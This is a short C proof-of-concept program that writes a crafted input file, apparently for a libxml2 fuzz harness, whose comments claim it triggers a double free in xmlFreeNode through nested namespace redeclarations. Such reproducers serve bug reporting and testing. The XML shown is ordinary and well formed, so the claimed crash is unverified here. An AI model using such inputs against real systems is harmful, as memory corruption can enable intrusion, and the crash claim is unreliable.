#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* XML payload that triggers bad_free in xmlFreeNode() */
    /* This uses a malformed namespace declaration that causes the SAX2 */
    /* parser to free a node twice during start element processing */
    const char *xml = "<root xmlns:n=\"http://example.com/ns\">"
                      "<n:child xmlns:n=\"http://example.com/ns2\">"
                      "<n:grandchild xmlns:n=\"http://example.com/ns\"/>"
                      "</n:child>"
                      "</root>";
    size_t xml_len = strlen(xml);

    /* Write binary header:
     * - 4-byte little-endian options = 0
     * - 4-byte little-endian encoding length = 0 (UTF-8 default)
     * - 4-byte little-endian XML payload length
     */
    uint32_t options = 0;
    uint32_t enc_len = 0;
    uint32_t xml_len_le = (uint32_t)xml_len;

    fwrite(&options, sizeof(options), 1, f);
    fwrite(&enc_len, sizeof(enc_len), 1, f);
    fwrite(&xml_len_le, sizeof(xml_len_le), 1, f);

    /* Write XML payload bytes */
    fwrite(xml, 1, xml_len, f);

    fclose(f);
    return 0;
}